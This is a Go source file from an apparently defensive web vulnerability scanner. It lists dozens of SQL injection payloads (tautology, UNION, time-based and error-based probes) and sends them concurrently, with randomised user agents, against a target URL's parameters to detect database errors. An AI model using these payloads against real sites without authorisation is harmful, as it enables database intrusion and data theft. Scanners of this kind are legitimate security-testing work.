package checks

import (
	"fmt"
	"io"
	"net/http"
	"strings"
	"sync"

	"whiteclaw/scanner/models"
)

var sqliPayloads = []string{
	"'", "''", `"`, "\\", "1'1",
	"' OR '1'='1", "' OR '1'='1'--", "' OR '1'='1'/*",
	`" OR "1"="1`, `" OR "1"="1"--`,
	"1 OR 1=1", "' OR 1=1--", "admin'--", "' OR 'x'='x",
	"') OR ('1'='1", "') OR 1=1--",
	"' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
	"' UNION SELECT NULL,NULL,NULL--", "1 UNION SELECT 1,2,3--",
	"0 UNION ALL SELECT NULL--",
	"' AND 1=1--", "' AND 1=2--", "1 AND 1=1--", "1 AND 1=2--",
	"' AND '1'='1", "' AND '1'='2",
	"1/0", "1 AND GTID_SUBSET(1,0)--",
	"' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",
	"1 AND SLEEP(1)--", "1 OR SLEEP(1)--",
	"'; WAITFOR DELAY '0:0:1'--",
	"1; SELECT pg_sleep(1)--",
	"1 AND BENCHMARK(2000000,MD5(1))--",
	"' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
	"' AND SUBSTRING(@@version,1,1)='5'--",
	"%27", "%22", "0x27",
	"' OR 1=1%00", "' HAVING 1=1--", "' GROUP BY 1--",
	"' ORDER BY 1--", "' ORDER BY 100--",
	"' || '1'='1",
	"';SELECT 1;--",
	"' AND EXISTS(SELECT 1 FROM users)--",
}

var sqlErrors = []string{
	"you have an error in your sql syntax",
	"warning: mysql",
	"mysql_fetch",
	"pg_query", "pg_exec",
	"sqlite3", "sqlstate",
	"ora-0",
	"microsoft sql server",
	"unclosed quotation",
	"syntax error", "sql syntax",
	"column not found",
	"table or view not found",
	"division by zero",
}

// SQLi tests URL parameters for SQL injection using a concurrent worker pool.
func SQLi(client *http.Client, cfg models.ScanConfig) {
	if len(cfg.Params) == 0 {
		models.Status("SQLi: no URL parameters found — skipping.")
		return
	}
	models.Status(fmt.Sprintf(
		"Testing SQL injection (%d payloads × %d params)...",
		len(sqliPayloads), len(cfg.Params),
	))

	type job struct{ param, payload string }
	jobs := make([]job, 0, len(cfg.Params)*len(sqliPayloads))
	for _, p := range cfg.Params {
		for _, pl := range sqliPayloads {
			jobs = append(jobs, job{p, pl})
		}
	}

	sem := newSem(cfg.Workers)
	var wg sync.WaitGroup
	reported := map[string]bool{}
	var mu sync.Mutex

	for _, j := range jobs {
		wg.Add(1)
		j := j
		sem.Acquire()
		go func() {
			defer wg.Done()
			defer sem.Release()

			mu.Lock()
			already := reported[j.param]
			mu.Unlock()
			if already {
				return
			}

			injected := injectParam(cfg.URL, j.param, j.payload)
			req, err := http.NewRequest("GET", injected, nil)
			if err != nil {
				return
			}
			req.Header.Set("User-Agent", randomUA())
			resp, err := client.Do(req)
			if err != nil {
				return
			}
			defer resp.Body.Close()
			body, _ := io.ReadAll(io.LimitReader(resp.Body, 256*1024))
			low := strings.ToLower(string(body))

			for _, sig := range sqlErrors {
				if strings.Contains(low, sig) {
					mu.Lock()
					if !reported[j.param] {
						reported[j.param] = true
						mu.Unlock()
						models.Emit(models.Finding{
							Type:     "finding",
							Severity: "CRITICAL",
							Category: "vulnerabilities",
							Title:    fmt.Sprintf("SQL injection in parameter %q", j.param),
							Detail:   fmt.Sprintf("Payload: %q\nError signature: %q\nURL: %s", j.payload, sig, injected),
							Fix:      "Use parameterised queries / prepared statements. Never interpolate user input into SQL.",
						})
					} else {
						mu.Unlock()
					}
					return
				}
			}
		}()
	}
	wg.Wait()
}
